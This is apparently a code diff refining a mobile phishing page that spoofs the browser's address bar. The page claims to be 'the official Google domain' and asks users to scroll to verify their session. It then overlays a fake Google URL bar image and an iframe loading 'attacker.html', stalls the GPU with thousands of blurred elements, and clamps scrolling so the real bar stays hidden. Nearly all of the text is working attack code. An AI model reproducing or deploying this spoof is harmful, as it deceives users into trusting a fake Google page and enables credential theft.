@@ -4,7 +4,7 @@
     <meta charset="UTF-8" />
     <meta
       name="viewport"
-      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover"
     />
     <title>azzzab</title>
     <style>
@@ -13,12 +13,14 @@
         margin: 0;
         padding: 0;
         width: 100%;
-        height: 200vh;
+        height: 300vh; /* Kita bikin lebih panjang biar scroll-nya dapet */
         background-color: #f8f9fa;
         font-family: sans-serif;
-        scroll-behavior: smooth;
         overflow-x: hidden;
+        /* KUNCI: Matikan efek membal di bawah */
+        overscroll-behavior-y: none !important;
       }
+
       #scroll-bait {
         display: flex;
         flex-direction: column;
@@ -29,6 +31,7 @@
         color: #5f6368;
         padding: 20px;
       }
+
       #fake-ui {
         display: none;
         position: fixed;
@@ -38,33 +41,34 @@
         height: 100vh;
         z-index: 99999;
         background: #fff;
+        touch-action: none; /* Matikan interaksi default di level UI */
       }
+
       #fake-bar {
         position: absolute;
-        bottom: 0;
+        bottom: 0; /* Tetap di bawah karena target kita address bar bawah */
         left: 0;
         width: 100%;
         height: 56px;
         object-fit: contain;
-        border-bottom: 1px solid #ddd;
-        z-index: 10;
+        border-top: 1px solid #ddd; /* Garis di atas karena bar di bawah */
+        z-index: 100;
         opacity: 0;
-        transition: opacity 0.1s ease-in;
-        pointer-events: none;
+        pointer-events: auto;
+        -webkit-user-drag: none;
+        touch-action: none;
       }
+
       #fake-content {
         position: absolute;
         top: 0;
         left: 0;
         width: 100%;
-        height: 100vh;
+        height: calc(100vh - 56px); /* Iframe berhenti sebelum bar bawah */
         border: none;
         z-index: 1;
-        display: block;
-        transition:
-          top 0.1s ease-in,
-          height 0.1s ease-in;
       }
+
       #gpu-killer {
         position: fixed;
         top: 0;
@@ -79,13 +83,14 @@
   <body>
     <div id="scroll-bait">
       <h2>
-        This is the official Google domain. Want to earn $100,000? Follow these
-        instructions. Please scroll down to the bottom of this page to proceed
-        to accounts.google.com.
+        This is the official Google domain.<br>
+        Please scroll down to verify your session.
       </h2>
       <div style="font-size: 50px; color: #1a73e8; margin-top: 30px">↓</div>
     </div>
+
     <div id="gpu-killer"></div>
+
     <div id="fake-ui">
       <img id="fake-bar" src="urlbar-google.jpg" alt="Google Address Bar" />
       <iframe id="fake-content" src="attacker.html"></iframe>
@@ -98,47 +103,65 @@
         const killerContainer = document.getElementById("gpu-killer");
         for (let i = 0; i < 2000; i++) {
           let div = document.createElement("div");
-          div.style.cssText = `position:absolute; width:200vw; height:10vh; background:rgba(0,0,0,0.01); backdrop-filter:blur(10px) contrast(200%); transform:rotate(${Math.random() * 360}deg);`;
+          div.style.cssText = `position:absolute; width:100vw; height:10vh; backdrop-filter:blur(10px); opacity:0.01;`;
           killerContainer.appendChild(div);
         }
         let start = Date.now();
-        while (Date.now() - start < 400) {}
+        while (Date.now() - start < 400) {} 
       }
 
-      window.addEventListener(
-        "scroll",
-        () => {
+      window.addEventListener("scroll", () => {
+          // Trigger pas user scroll down
           if (window.scrollY > 80 && !isSpoofed) {
             isSpoofed = true;
             document.getElementById("fake-ui").style.display = "block";
             triggerMeltdown();
-            window.scrollTo(0, 0);
-            setTimeout(() => {
-              document.getElementById("gpu-killer").innerHTML = "";
-            }, 1000);
+            
+            // KUNCI: Pindah ke koordinat aman agar bar asli ngumpet
+            window.scrollTo(0, 50);
           }
-        },
-        { passive: true },
-      );
+          
+          // ANTI-MENTOK LOGIC (The Safety Buffer)
+          if (isSpoofed) {
+              const scrollPos = window.pageYOffset || document.documentElement.scrollTop;
+              const windowHeight = window.innerHeight;
+              const bodyHeight = document.documentElement.scrollHeight;
+
+              // Kalau jempol user narik sampai mau mentok bawah (danger zone buat bar bawah)
+              if (scrollPos + windowHeight >= bodyHeight - 2) {
+                  // Tendang balik ke atas 5 pixel secara instan
+                  window.scrollTo(0, bodyHeight - windowHeight - 5);
+              }
+              
+              // Kalau coba ditarik ke paling atas (danger zone buat bar atas)
+              if (scrollPos <= 2) {
+                  window.scrollTo(0, 5);
+              }
+          }
+      }, { passive: false });
 
       window.addEventListener("message", (e) => {
         if (e.data === "SNAP_TRAP") {
           let fakeBar = document.getElementById("fake-bar");
-          let fakeContent = document.getElementById("fake-content");
           fakeBar.style.opacity = "1";
-          fakeBar.style.pointerEvents = "auto";
-          fakeContent.style.top = "56px";
-          fakeContent.style.height = "calc(100vh - 56px)";
+          
+          // RE-ANCHOR: Pastikan kita stay di zona tengah terus
+          setInterval(() => {
+              if(isSpoofed) {
+                  // Cek kalau posisi melenceng dari zona aman, balikin!
+                  if (window.scrollY < 10) window.scrollTo(0, 20);
+              }
+          }, 50);
         }
       });
 
-      document.getElementById("fake-bar").addEventListener(
-        "touchmove",
-        (e) => {
-          if (isSpoofed) e.preventDefault();
-        },
-        { passive: false },
-      );
+      // BLOKIR INTERAKSI PADA FAKE BAR
+      const fb = document.getElementById("fake-bar");
+      ['touchstart', 'touchmove', 'touchend'].forEach(evt => {
+        fb.addEventListener(evt, (e) => {
+            if (isSpoofed) e.preventDefault();
+        }, { passive: false });
+      });
     </script>
   </body>
 </html>
